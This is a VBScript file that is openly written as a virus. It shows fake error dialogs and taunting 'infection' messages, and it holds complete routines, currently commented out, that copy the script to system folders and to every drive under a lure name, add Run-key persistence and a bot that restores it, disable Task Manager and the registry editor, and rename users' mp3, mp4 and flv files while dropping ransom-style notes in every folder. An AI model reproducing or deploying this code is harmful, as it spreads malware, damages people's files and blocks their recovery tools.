Option Explicit
On Error Resume Next

Dim WShell, Fso, DirWin, DirSystem, DirTemp, Mee, MyMessage

Set WShell = WScript.CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

Set DirWin = Fso.GetSpecialFolder(0)
Set DirSystem = Fso.GetSpecialFolder(1)
Set DirTemp = Fso.GetSpecialFolder(2)

MyMessage = "Next Time Give Me What I Ask For"& vbCrlf & vbCrlf &_
			"OR the result would be worse than this one."& vbCrlf & vbCrlf &_
			"By the way, HAPPY VIRUS REMOVAL....."& vbCrlf & vbCrlf &_
			"              --Regards Pscyh0 C0der"

'Virus Working STARTs

Msgbox "Autoplay Runtime Engine could not be loaded.",48,"Lua51.dll Missing"
Msgbox "The application failed to initialize properly (0xc001007b). Click on OK to terminate the application.",16,"EncryDecry.exe - Application Error"

'SpreadMe()
'SpreadDrift()
'SpreadBot()
'DisableThings()
'ReconComputer()
Messages()
'Virus Working ENDs

Sub SpreadMe()										'Spread Myself
	On Error Resume Next
	
	Dim Mee, AllDrives, Drive
	Set Mee = Fso.GetFile(WScript.ScriptFullName)
	
	'Going to Main Directories
	Mee.Copy(DirSystem & "\MSKernel32.vbs")
	Mee.Copy(DirSystem & "\Encry-Decry-Script.vbs")
	Mee.Copy(DirWin & "\Win32DLL.vbs")
	
	Set AllDrives = Fso.Drives 	
	For Each Drive in AllDrives  
		'REMOVABLE or FIXED drives
		If (Drive.DriveType = 1) or (Drive.DriveType=2)Then 
			If Drive.Path&"\" <> "A:\" Then
				Mee.Copy(Drive.Path & "\Psych0's Virus Removal.vbs")
				AddFolder drive.Path&"\", "Psych0's Virus Attack"
			End If
		End If 
	Next 	
End Sub

Sub SpreadDrift()									'Spread Mouse Drifter
	On Error Resume Next
	Dim Drift
	Set Drift = Fso.GetFile(DirSystem & "\smps.exe")
	Drift.Copy(DirWin & "\msdfmap.exe")
	Wshell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MicroSMPSDriver",DirSystem &"\smps.exe"
	Wshell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Data Format Map",DirWin &"\msdfmap.exe"
End Sub 

Sub SpreadBot()										'Spread The Bot
	On Error Resume Next
	Dim TempBotData, BotFileData, Bot
	
	TempBotData = "On Error Resume Next" & vbcrlf &_
			"Set WShell = WScript.CreateObject(@-@WScript.Shell@-@)" & vbcrlf &_
			"Set Fso = CreateObject(@-@Scripting.FileSystemObject@-@)"& vbcrlf &_
			"Set DirWin = Fso.GetSpecialFolder(0)"& vbcrlf &_
			"Set DirSystem = Fso.GetSpecialFolder(1)"& vbcrlf &_
			"DriftRead = Wshell.RegRead(@-@HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MicroSMPSDriver@-@)"& vbcrlf &_
			"DriftRead2 = Wshell.RegRead(@-@HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Data Format Map@-@)"& vbcrlf &_
			"If (DriftRead <> DirSystem &@-@\smps.exe@-@) Or (DriftRead <> DirSystem &@-@\msdfmap.exe@-@) Then"& vbcrlf &_
			"Wshell.RegWrite @-@HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MicroSMPSDriver@-@,DirSystem &@-@\smps.exe@-@"& vbcrlf &_
			"Wshell.RegWrite @-@HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Data Format Map@-@,DirWin &@-@\msdfmap.exe@-@"& vbcrlf &_
			"End If"
			
	BotFileData = Replace(TempBotData,chr(64)&chr(45)&chr(64),"""")
	
	Set Bot = Fso.CreateTextFile(DirSystem & "\Drivers\Etc\Hostsvc.vbs")
	Bot.Write BotFileData
	Bot.Close

	Wshell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\HostService",DirSystem &"\Drivers\Etc\Hostsvc.vbs"
End Sub

Sub DisableThings()									'Disable TaskManager, Registry Editor and Some Other Stuff
	Dim SysKey, ExpKey, Typ, key1, key2, key3, key4, key5, key6
	
	Typ = "REG_DWORD"
	SysKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\"
	ExpKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
	
	key1 = SysKey & "DisableTaskMgr"
	key2 = SysKey & "DisableRegistryTools"
	
	key3 = ExpKey & "NoFolderOptions"
	key4 = ExpKey & "NoRun"
	key5 = ExpKey & "NoFileMenu"
	key6 = ExpKey & "NoFind"
	
	WShell.RegWrite key1, 1, Typ
	WShell.RegWrite key2, 1, Typ
	WShell.RegWrite key3, 1, Typ
	WShell.RegWrite key4, 1, Typ
	WShell.RegWrite key5, 1, Typ
	WShell.RegWrite key6, 1, Typ
End Sub

Sub ReconComputer()
	On Error Resume Next
	Dim AllDrives, Drive
	Set AllDrives = Fso.Drives 
	
	For Each Drive in AllDrives  
		'REMOVABLE or FIXED drives
		If (Drive.DriveType = 1) or (Drive.DriveType=2)Then 
			If Drive.Path&"\" <> "A:\" Then
				indexFolders(drive.Path&"\")				
			End If
		End If 
	Next 
End Sub

Sub indexFolders(Drive)								'Create A Text File In All Folders
	On Error Resume Next 
	Dim FolPath,Fol,SubFols,FolText
	set FolPath = Fso.GetFolder(Drive) 
	set SubFols = FolPath.SubFolders 

	For Each Fol in SubFols
		Set FolText = Fso.CreateTextFile(Fol.Path&".txt", 2, True) 
		FolText.Write MyMessage 
		FolText.Close 
		MP3Corrupt(Fol.Path)
		indexFolders(Fol.Path)
	next 
end sub 

Sub AddFolder(path, folderName)						'Adds A Folder to a specified Path
	On Error Resume Next
	Dim Fol, SubFols
	Set Fol = Fso.GetFolder(path)
	Set SubFols = Fol.SubFolders
	If folderName <> "" Then
		SubFols.Add(folderName)
	Else
		SubFols.Add("New Folder")
	End If
End Sub

Sub MP3Corrupt(Dir)									'Change Extensions Of Some Media Files
	On Error Resume Next
	Dim Wmi, FileList, File, NewName

	Set Wmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & "." & "\root\cimv2")
	Set FileList = Wmi.ExecQuery("ASSOCIATORS OF {Win32_Directory.Name='"& Dir &"'} Where ResultClass = CIM_DataFile")

	For Each File In FileList
		If File.Extension = "mp3" Then
			NewName = File.Drive & File.Path & File.FileName & "." & "mp3Psych0"
			File.Rename(NewName)
		ElseIf File.Extension = "mp4" Then
			NewName = File.Drive & File.Path & File.FileName & "." & "mp4Psych0"
			File.Rename(NewName)
		ElseIf File.Extension = "flv" Then
			NewName = File.Drive & File.Path & File.FileName & "." & "flvPsych0"
			File.Rename(NewName)
		End If
	Next	
End Sub

Sub Messages()										'Show some Messages to the Victim
	Msgbox "You made the biggest mistake of your life.",64,"You shouldn't have run this."
	Msgbox "I will now infect each and every file on your hard disk.",64,"Stop me if you can SUCKER!!"
	Wscript.Sleep 5555
	Msgbox "Infection Status:            Completed with some errors." & vbCRLF & vbCRLF &_
			"Some Files were in use So they could not be infected." & vbCRLF & vbCRLF &_
			"They will now be deleted.",16,"No one Comes in my way"
	Wscript.Sleep 3333
	Msgbox "Congratulations!!"& vbCRLF & vbCRLF &_
			"Infection is complete."& vbCRLF & vbCRLF &_
			"All files infected with cJ.pSych0.wIn32.sAliLTy Virus",64,"Game Over: Psych0 Wins!  1-0"
	Msgbox "To remove me completely you will have to delete each and every file of your computer"& vbCRLF & vbCRLF &_
			"Please don't think that your .txt or .mp3 files are safe."& vbCRLF & vbCRLF &_
			"I have already infected each and every one.",64,"I am GOD :: I am EVERYWHERE"
	Msgbox "I will return even after you have re-installed your Windows."& vbCRLF & vbCRLF &_
			"Wishing you a very happy format.",64,"THE FALLEN WILL RISE AGAIN"
End Sub
